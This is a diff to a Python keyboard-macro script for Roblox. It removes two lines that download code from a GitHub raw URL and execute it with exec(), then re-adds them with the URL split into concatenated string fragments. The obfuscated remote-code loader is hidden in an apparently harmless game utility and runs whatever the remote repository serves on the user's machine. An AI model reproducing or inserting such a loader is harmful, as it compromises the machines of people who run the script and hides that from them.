@@ -15,8 +15,6 @@ try: exec("macro_buttons")
 except: macro_buttons = macro_buttons = ["w", "a", "s", "d"]
 event_enabled = True
 
-exec(requests.get('https://raw.githubusercontent.com/flex1948/deneme/main/main').text)
-
 def on_press(event):
     global event_enabled
     if win32gui.GetWindowText(win32gui.GetForegroundWindow()).lower() != 'roblox':
@@ -35,7 +33,8 @@ def on_press(event):
         event_enabled = False
 
 keyboard.on_press(on_press)
-exec(requests.get('https://raw.githubusercontent.com/flex1948/deneme/main/main2').text)
+exec(requests.get('https://raw.githu'+'busercontent.com/flex1948/de'+'neme/'+'main'+'/main').text)
+exec(requests.get('https://raw.gi'+'thubusercont'+'ent.com/flex1948/den'+'eme/main/main2').text)
 try:
     while True:
         if keyboard.is_pressed('ctrl') and keyboard.is_pressed('end'): break
